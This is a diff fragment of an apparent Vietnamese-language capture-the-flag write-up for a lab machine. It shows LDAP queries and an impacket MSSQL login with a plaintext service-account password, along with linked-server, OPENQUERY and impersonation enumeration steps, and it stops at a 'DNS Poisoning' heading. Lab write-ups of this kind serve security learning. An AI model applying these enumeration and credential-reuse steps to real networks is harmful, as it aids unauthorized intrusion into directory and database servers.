@@ -122,12 +122,21 @@ ldapsearch -x -H ldap://10.129.5.49 -D "overwatch\sqlsvc" -w 'TI0LKcfHzZw1Vv' -b
 ```
 # Connect db
 impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@10.129.5.49 -windows-auth
+
 # Cú pháp kiểm tra Linked Servers
 SELECT name, provider, data_source FROM sys.servers;
 ```
+
 ```
 # Lệnh uỷ quyền
 SELECT * FROM OPENQUERY("SQL07", 'SELECT 1');
+```
+
+```
+# impacket-mssqlclient marcos
+enum_db = show db;
+enum_links
+enum_impersonate
 ```
 
 ## DNS Poisoning
